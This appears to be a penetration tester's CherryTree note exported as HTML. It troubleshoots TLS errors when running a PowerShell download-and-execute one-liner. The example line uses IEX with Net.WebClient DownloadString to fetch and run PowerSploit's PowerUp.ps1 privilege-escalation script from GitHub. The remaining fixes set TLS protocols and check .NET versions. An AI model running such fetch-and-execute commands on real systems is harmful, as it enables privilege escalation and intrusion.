<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>DownloadString</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>DownloadString</h1><br />When we are using one-liner to Download a file from the Internet and then
    execute directly a command from it<br /><span style="color:#a5452a;">example:</span><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).downloadstring(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&nbsp;&#39;);
      </div>
    </div><br /><br /><span style="color:#ff0000;">Errors:</span><br /><a href=""><img src="images/1160-1.png"
        alt="images/1160-1.png" /></a><br />or<br /><a href=""><img src="images/1160-2.png"
        alt="images/1160-2.png" /></a><br /><br /><strong>Solution</strong><br />This can happen when we use older
    versions of Windows and a site no longer accept TLSv1, which winhttp uses by default. .<br />To do that we have
    different option<br />• Have a version of Powershell equal or greater to 3.0<br />
    <div class="codebox">
      <div class="codebox">PS&gt;&nbsp;Get-Host</div>
    </div><br />• change values of Net.ServicePointManager<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;[Net.ServicePointManager]::SecurityProtocol&nbsp;=&nbsp;&quot;tls12,&nbsp;tls11,&nbsp;tls,&nbsp;Ssl3&quot;
      </div>
    </div><br /> or in alternative<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;[Net.ServicePointManager]::SecurityProtocol&nbsp;=&nbsp;[Net.SecurityProtocolType]::Tls12</div>
    </div><br /> or in alternative install .NET 4.6.2 that changes the default TLS scheme to 1.2<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(Get-ItemProperty&nbsp;&quot;HKLM:SOFTWARE\Microsoft\NET&nbsp;Framework&nbsp;Setup\NDP\v4\Full&quot;).Release
      </div>
    </div><br /> to check the release of .NET correspondent to DWORD of Release go to <a
      href="https://support.tibco.com/s/article/How-to-find-what-Microsoft-NET-version-is-installed" target="_blank">this
      site</a><br /><br /><br /><span style="color:#ff0000;">Error:</span><br />if we have this error <br /> <a
      href=""><img src="images/1160-3.png" alt="images/1160-3.png" /></a><br /> see <a
      href="https://blog.ukotic.net/2017/08/15/could-not-establish-trust-relationship-for-the-ssltls-invoke-webrequest/" target="_blank">https://blog.ukotic.net/2017/08/15/could-not-establish-trust-relationship-for-the-ssltls-invoke-webrequest/</a>
  </div>
</body>

</html>